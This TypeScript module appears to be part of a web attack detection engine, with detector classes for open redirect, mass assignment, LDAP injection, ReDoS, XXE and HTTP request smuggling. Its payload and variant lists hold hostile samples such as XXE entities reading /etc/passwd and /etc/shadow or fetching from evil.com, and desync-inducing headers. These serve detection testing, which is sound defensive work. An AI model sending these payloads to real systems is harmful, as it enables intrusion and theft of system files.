/**
 * Open redirect, mass assignment, LDAP, ReDoS
 */
import type { InvariantClassModule, DetectionLevelResult } from '../types.js'
import { deepDecode } from '../encoding.js'
import { l2OpenRedirect, l2LDAPInjection } from '../../evaluators/l2-adapters.js'
import { detectXXE } from '../../evaluators/xxe-evaluator.js'
import { detectHTTPSmuggling } from '../../evaluators/http-smuggle-evaluator.js'

function normalizeHttpInput(input: string): string {
    return deepDecode(input)
        .replace(/\\r\\n/g, '\r\n')
        .replace(/\\n/g, '\n')
}

function tokenizeHttpHeaders(input: string): Array<{ name: string; value: string; line: number }> {
    const headers: Array<{ name: string; value: string; line: number }> = []
    const normalized = normalizeHttpInput(input)
    const lines = normalized.split(/\r?\n/)
    for (let i = 0; i < lines.length; i++) {
        const line = lines[i]
        if (line.trim() === '') break
        const colon = line.indexOf(':')
        if (colon <= 0) continue
        const name = line.slice(0, colon).trim().toLowerCase()
        const value = line.slice(colon + 1).trim()
        if (/^[a-z0-9-]+$/.test(name)) {
            headers.push({ name, value, line: i })
        }
    }
    return headers
}

function l2LegacyXXE(input: string): DetectionLevelResult | null {
    const decoded = deepDecode(input)
    const detections = detectXXE(decoded)
    if (detections.length === 0) return null

    const best = detections.reduce((a, b) => (a.confidence > b.confidence ? a : b))
    const marker = best.entityName && best.entityName !== 'unknown'
        ? best.entityName
        : '<!ENTITY'

    return {
        detected: true,
        confidence: best.confidence,
        explanation: `XXE structure analysis: ${best.detail}`,
        evidence: best.detail,
        structuredEvidence: [{
            operation: 'semantic_eval',
            matchedInput: marker,
            interpretation: best.detail,
            offset: Math.max(0, decoded.toLowerCase().indexOf(marker.toLowerCase())),
            property: 'XML entities must not resolve attacker-controlled external resources',
        }],
    }
}

function l2LegacyHttpSmuggling(input: string): DetectionLevelResult | null {
    const decoded = normalizeHttpInput(input)
    const headers = tokenizeHttpHeaders(decoded)

    const hasCL = headers.some(h => h.name === 'content-length')
    const hasTE = headers.some(h => h.name === 'transfer-encoding')
    const teHeaders = headers.filter(h => h.name === 'transfer-encoding')
    const hasExpect = headers.some(h => h.name === 'expect' && /100-continue/i.test(h.value))

    const clZero = headers.find(h => h.name === 'content-length' && h.value === '0')
    const bodyBoundary = decoded.includes('\r\n\r\n')
        ? decoded.indexOf('\r\n\r\n') + 4
        : decoded.indexOf('\n\n') >= 0
            ? decoded.indexOf('\n\n') + 2
            : -1
    const body = bodyBoundary >= 0 ? decoded.slice(bodyBoundary) : ''
    const embeddedRequestCount = (decoded.match(/(?:GET|POST|PUT|DELETE|PATCH|HEAD|OPTIONS)\s+\/[^\s]*\s+HTTP\/[\d.]+/gi) ?? []).length

    const l2Candidates: DetectionLevelResult[] = []
    for (const d of detectHTTPSmuggling(decoded)) {
        l2Candidates.push({
            detected: true,
            confidence: d.confidence,
            explanation: `HTTP parser analysis: ${d.detail}`,
            evidence: d.detail,
        })
    }

    if (hasCL && hasTE) {
        l2Candidates.push({
            detected: true,
            confidence: 0.95,
            explanation: 'HTTP header tokenization found both Content-Length and Transfer-Encoding in one request (desync ambiguity)',
            evidence: 'Content-Length + Transfer-Encoding',
        })
    }

    if (teHeaders.length > 1) {
        l2Candidates.push({
            detected: true,
            confidence: 0.93,
            explanation: `HTTP header tokenization found ${teHeaders.length} Transfer-Encoding headers (TE/TE desync)`,
            evidence: teHeaders.map(h => h.value).join(' | '),
        })
    }

    if (clZero && body.trim().length > 0) {
        l2Candidates.push({
            detected: true,
            confidence: 0.94,
            explanation: `HTTP framing mismatch: Content-Length: 0 with non-empty body (${body.length} bytes)`,
            evidence: `CL:0 + body:${body.slice(0, 80)}`,
        })
    }

    if (hasExpect && (hasCL || hasTE || embeddedRequestCount >= 2)) {
        l2Candidates.push({
            detected: true,
            confidence: 0.90,
            explanation: `Expect: 100-continue combined with framing ambiguity (${embeddedRequestCount} HTTP request lines)`,
            evidence: 'Expect: 100-continue + framing mismatch',
        })
    }

    if (l2Candidates.length === 0) return null
    return l2Candidates.reduce((a, b) => (a.confidence > b.confidence ? a : b))
}

export const openRedirectBypass: InvariantClassModule = {
    id: 'open_redirect_bypass',
    description: 'Open redirect bypass — URL schemes and encoding tricks to redirect to malicious domains',
    category: 'injection',
    severity: 'medium',
    calibration: { baseConfidence: 0.75 },

    mitre: ['T1566.002'],
    cwe: 'CWE-601',

    knownPayloads: [
        '?redirect=//evil.com',
        '?url=https://evil.com',
        '?next=%2F%2Fevil.com',
        '?redirect=\\\\evil.com\\path',
    ],

    knownBenign: [
        '?redirect=/home',
        '?url=/dashboard',
        '?next=/login',
        '/api/redirect',
    ],

    detect: (input: string): boolean => {
        const d = deepDecode(input)
        return (/\/\/[^/]+\.[^/]+/.test(d) && /(?:redirect|url|next|return|goto|dest|target|rurl|forward)\s*[=:]/i.test(d))
            || /\\\\[^\\]+\\/.test(d)
            || /(?:redirect|url|next|goto)=(?:\/\/|https?:|%2[fF]%2[fF])/i.test(input)
    },
    detectL2: l2OpenRedirect,
    generateVariants: (count: number): string[] => {
        const v = ['?redirect=//evil.com', '?url=https://evil.com', '?next=%2F%2Fevil.com',
            '?redirect=\\\\evil.com\\path', '?goto=//evil.com%0d%0a']
        return v.slice(0, count)
    },
}

export const massAssignment: InvariantClassModule = {
    id: 'mass_assignment',
    description: 'Mass assignment attack — injecting admin/role/privilege fields in request bodies',
    category: 'injection',
    severity: 'high',
    calibration: { baseConfidence: 0.80 },

    mitre: ['T1548'],
    cwe: 'CWE-915',

    knownPayloads: [
        '{"name":"test","role":"admin"}',
        '{"email":"a@b.com","isAdmin":true}',
        '{"username":"test","is_admin":true,"access_level":"superuser"}',
    ],

    knownBenign: [
        '{"name":"test","email":"test@test.com"}',
        '{"username":"john","age":25}',
        '{"title":"post","content":"hello"}',
    ],

    detect: (input: string): boolean => {
        const d = deepDecode(input)
        return /(?:"|\b)(?:role|isAdmin|is_admin|admin|privilege|permission|access_level|user_type|account_type|verified|approved|activated)\s*"\s*:\s*(?:true|"admin"|"root"|1|"superuser")/i.test(d)
    },
    generateVariants: (count: number): string[] => {
        const v = ['{"name":"test","role":"admin"}', '{"email":"a@b.com","isAdmin":true}',
            '{"username":"test","is_admin":true,"access_level":"superuser"}',
            '{"name":"test","permission":"admin","verified":true}']
        return v.slice(0, count)
    },
}

export const ldapFilterInjection: InvariantClassModule = {
    id: 'ldap_filter_injection',
    description: 'LDAP filter injection — unescaped metacharacters in LDAP search filters',
    category: 'injection',
    severity: 'high',
    calibration: { baseConfidence: 0.82 },

    mitre: ['T1190'],
    cwe: 'CWE-90',

    knownPayloads: [
        '*)(uid=*))(|(uid=*',
        '*(|(mail=*))',
        'admin)(|(password=*)',
    ],

    knownBenign: [
        'search for user',
        'filter by name',
        'uid=12345',
        '(status=active)',
    ],

    detect: (input: string): boolean => {
        const d = deepDecode(input)
        return /\(\|?\(?\w+=\*\)/.test(d)
            || /\)\(\w+=/.test(d)
            || /\(\|\(\w+=\*\)\)/.test(d)
            || (/\x00/.test(d) && /\(/.test(d))
    },
    detectL2: l2LDAPInjection,
    generateVariants: (count: number): string[] => {
        const v = ['*)(uid=*))(|(uid=*', '*(|(mail=*))', 'admin)(|(password=*)',
            '*)(&(objectClass=*)']
        return v.slice(0, count)
    },
}

export const regexDos: InvariantClassModule = {
    id: 'regex_dos',
    description: 'Regular expression denial of service — catastrophic backtracking inputs',
    category: 'injection',
    severity: 'medium',
    calibration: { baseConfidence: 0.70, minInputLength: 50 },

    mitre: ['T1499.004'],
    cwe: 'CWE-1333',

    knownPayloads: [
        'a'.repeat(100) + '!',
        'x'.repeat(200),
        'a'.repeat(120) + 'x'.repeat(120),
    ],

    knownBenign: [
        'normal input text',
        'short string',
        'hello world',
        'a'.repeat(10),
    ],

    detect: (input: string): boolean => {
        if (input.length < 50) return false
        let maxRun = 1
        let currentRun = 1
        for (let i = 1; i < input.length; i++) {
            if (input[i] === input[i - 1]) {
                currentRun++
                if (currentRun > maxRun) maxRun = currentRun
            } else {
                currentRun = 1
            }
        }
        return maxRun >= 50
    },
    generateVariants: (count: number): string[] => {
        const v = ['a'.repeat(100) + '!', 'x'.repeat(200),
        'b'.repeat(60) + 'y'.repeat(60)]
        return v.slice(0, count)
    },
}

export const xxeInjection: InvariantClassModule = {
    id: 'xxe_injection',
    description: 'XXE Injection',
    category: 'injection',
    severity: 'critical',
    calibration: { baseConfidence: 0.90 },
    formalProperty: `∃ decl ∈ parse(input, XML_DTD_GRAMMAR) :
        decl.kind = ENTITY ∧ decl.source ∈ {SYSTEM, PUBLIC}
        → parser_resolves_external_resource(decl.source)`,
    mitre: ['T1190'],
    cwe: 'CWE-611',
    knownPayloads: ['<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>', '<?xml version="1.0"?><!ENTITY % xxe SYSTEM "http://evil.com/xxe">', '<!ENTITY xxe SYSTEM "file:///etc/shadow">'],
    knownBenign: ['xml version="1.0" encoding="UTF-8"?>', '<!DOCTYPE html PUBLIC', 'valid xml document'],
    detect: (input: string): boolean => {
        const d = deepDecode(input)
        return /<\!(?:DOCTYPE|ENTITY)\s+[^>]*(?:SYSTEM|PUBLIC)\s+['"][^'"]+['"]/i.test(d)
    },
    detectL2: l2LegacyXXE,
    generateVariants: (count: number): string[] => {
        const v = ['<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>', '<?xml version="1.0"?><!ENTITY % xxe SYSTEM "http://evil.com/xxe">', '<!ENTITY xxe SYSTEM "file:///etc/shadow">']
        const r: string[] = []
        for (let i = 0; i < count; i++) r.push(v[i % v.length])
        return r
    },
}

export const httpSmuggling: InvariantClassModule = {
    id: 'http_smuggling',
    description: 'HTTP Request Smuggling',
    category: 'injection',
    severity: 'critical',
    calibration: { baseConfidence: 0.90 },
    formalProperty: `∃ parseA, parseB ∈ parse(request, HTTP_GRAMMAR) :
        boundaries(parseA) ≠ boundaries(parseB)
        → frontend_backend_desync`,
    mitre: ['T1190'],
    cwe: 'CWE-444',
    knownPayloads: ['Transfer-Encoding: chunked\\r\\nContent-Length: 0', 'GET / HTTP/1.1\\r\\nHost: internal\\r\\nTransfer-Encoding: chunked', 'POST / HTTP/1.1\\r\\nContent-Length: 6\\r\\nTransfer-Encoding: chunked'],
    knownBenign: ['Content-Type: application/json', 'Content-Length: 42', 'HTTP/1.1 200 OK'],
    detect: (input: string): boolean => {
        const d = deepDecode(input)
        return /transfer-encoding\s*:.*?(?:chunked|identity)[\s\S]*?content-length\s*:|content-length\s*:\s*\d+[\s\S]*?transfer-encoding\s*:|transfer-encoding\s*:\s*chunked/i.test(d)
    },
    detectL2: l2LegacyHttpSmuggling,
    generateVariants: (count: number): string[] => {
        const v = ['Transfer-Encoding: chunked\\r\\nContent-Length: 0', 'GET / HTTP/1.1\\r\\nHost: internal\\r\\nTransfer-Encoding: chunked', 'POST / HTTP/1.1\\r\\nContent-Length: 6\\r\\nTransfer-Encoding: chunked']
        const r: string[] = []
        for (let i = 0; i < count; i++) r.push(v[i % v.length])
        return r
    },
}
